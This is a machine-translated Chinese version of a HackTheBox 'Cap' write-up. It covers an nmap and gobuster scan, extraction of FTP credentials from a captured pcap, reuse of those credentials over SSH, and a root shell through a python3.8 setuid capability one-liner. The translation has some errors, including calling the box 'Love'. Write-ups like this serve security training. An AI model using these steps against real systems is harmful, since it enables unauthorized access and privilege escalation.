<html>
<head>
<title>Cap-HTB| writeup, HackTheBox</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTB船长|特写，黑客盒子</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cap-htb-writeup-hackthebox-882bb62bd60b?source=collection_archive---------1-----------------------#2021-08-03">https://infosecwriteups.com/cap-htb-writeup-hackthebox-882bb62bd60b?source=collection_archive---------1-----------------------#2021-08-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="e4e6" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">这是我为HackTheBox上的“爱”盒子写的文章</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/685615512ae8edc92866e66c336d8028.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qfcNnE8hPfwuKySRTAqevA.png"/></div></div></figure><h1 id="d8cb" class="kr ks iq bd kt ku kv kw kx ky kz la lb jw lc jx ld jz le ka lf kc lg kd lh li bi translated">侦察</h1><pre class="kg kh ki kj gt lj lk ll lm aw ln bi"><span id="fc34" class="lo ks iq lk b gy lp lq l lr ls">Nmap scan report for 10.10.10.245<br/>Host is up (0.079s latency).<br/>Not shown: 997 closed ports<br/>PORT   STATE SERVICE VERSION<br/>21/tcp open  ftp     vsftpd 3.0.3<br/>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)<br/>|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)<br/>|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)<br/>80/tcp open  http    gunicorn<br/>| fingerprint-strings: <br/>|   FourOhFourRequest: <br/>|     HTTP/1.0 404 NOT FOUND<br/>|     Server: gunicorn<br/>|     Date: Sun, 06 Jun 2021 02:22:52 GMT<br/>|     Connection: close<br/>|     Content-Type: text/html; charset=utf-8<br/>|     Content-Length: 232<br/>|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;<br/>|     &lt;title&gt;404 Not Found&lt;/title&gt;<br/>|     &lt;h1&gt;Not Found&lt;/h1&gt;<br/>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</span></pre><h1 id="2393" class="kr ks iq bd kt ku kv kw kx ky kz la lb jw lc jx ld jz le ka lf kc lg kd lh li bi translated">gobuster</h1><pre class="kg kh ki kj gt lj lk ll lm aw ln bi"><span id="04cf" class="lo ks iq lk b gy lp lq l lr ls">gobuster dir -u http://10.10.10.245/ -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 50<br/>===============================================================<br/>Gobuster v3.1.0<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url:                     http://10.10.10.245/<br/>[+] Method:                  GET<br/>[+] Threads:                 50<br/>[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt<br/>[+] Negative Status codes:   404<br/>[+] User Agent:              gobuster/3.1.0<br/>[+] Timeout:                 10s<br/>===============================================================<br/>Starting gobuster in directory enumeration mode<br/>===============================================================<br/>/data                 (Status: 302) [Size: 208] [--&gt; http://10.10.10.245/]<br/>/ip                   (Status: 200) [Size: 17464]                         <br/>/capture              (Status: 302) [Size: 220] [--&gt; http://10.10.10.245/data/7]<br/>                                                                                <br/>===============================================================</span></pre><p id="a96e" class="pw-post-body-paragraph lt lu iq lv b lw lx jr ly lz ma ju mb mc md me mf mg mh mi mj mk ml mm mn mo ij bi translated">数据目录看起来很有趣。我们去看看。</p><p id="1fb6" class="pw-post-body-paragraph lt lu iq lv b lw lx jr ly lz ma ju mb mc md me mf mg mh mi mj mk ml mm mn mo ij bi translated">在<code class="fe mp mq mr lk b">/data</code>目录中找到了太多的<code class="fe mp mq mr lk b">files</code>。在点击并尝试了<code class="fe mp mq mr lk b">directory</code>中的每个文件后，我发现了一个名为<code class="fe mp mq mr lk b">0</code>的<code class="fe mp mq mr lk b">interesting</code>文件。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ms"><img src="../Images/24c745918cd5bbe4e4bf9d4c1f155ce1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IbOhgcOwXMvjgTe1qy0b-w.png"/></div></div></figure><p id="eaec" class="pw-post-body-paragraph lt lu iq lv b lw lx jr ly lz ma ju mb mc md me mf mg mh mi mj mk ml mm mn mo ij bi translated">下载后，我们找到的文件是一个. pcap文件。所以我们找到了窃听器。然后，我们只对ftp流量应用过滤器，在这里我们可以找到用户名和密码。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mt"><img src="../Images/15ac06ef075ef85273a10cf3f46954fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ecB2nwRYYGEoIlhyi3Uisg.png"/></div></div></figure><p id="03f5" class="pw-post-body-paragraph lt lu iq lv b lw lx jr ly lz ma ju mb mc md me mf mg mh mi mj mk ml mm mn mo ij bi translated">幸运的是，这些也是对ssh有用的。</p><p id="8a8c" class="pw-post-body-paragraph lt lu iq lv b lw lx jr ly lz ma ju mb mc md me mf mg mh mi mj mk ml mm mn mo ij bi translated">所以，现在我们通过ssh以nathan的身份登录:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mu"><img src="../Images/2686d5b1ae049f8ef28e6ade1e8206b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iQL4zhr7xurpE7clRGWwEg.png"/></div></div></figure><p id="a680" class="pw-post-body-paragraph lt lu iq lv b lw lx jr ly lz ma ju mb mc md me mf mg mh mi mj mk ml mm mn mo ij bi translated">现在，我们可以读取user.txt</p><h1 id="aa3a" class="kr ks iq bd kt ku kv kw kx ky kz la lb jw lc jx ld jz le ka lf kc lg kd lh li bi translated">权限提升</h1><p id="5057" class="pw-post-body-paragraph lt lu iq lv b lw mv jr ly lz mw ju mb mc mx me mf mg my mi mj mk mz mm mn mo ij bi translated">现在，使用linpeas收集关于这台机器的更多信息。</p><p id="da8a" class="pw-post-body-paragraph lt lu iq lv b lw lx jr ly lz ma ju mb mc md me mf mg mh mi mj mk ml mm mn mo ij bi translated">在分析了输出之后，我发现了一个带有<code class="fe mp mq mr lk b">python3.8</code>的功能选项卡</p><p id="b3a8" class="pw-post-body-paragraph lt lu iq lv b lw lx jr ly lz ma ju mb mc md me mf mg mh mi mj mk ml mm mn mo ij bi translated">GTFObins将帮助您获得root:</p><pre class="kg kh ki kj gt lj lk ll lm aw ln bi"><span id="3305" class="lo ks iq lk b gy lp lq l lr ls">python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'</span></pre></div></div>    
</body>
</html>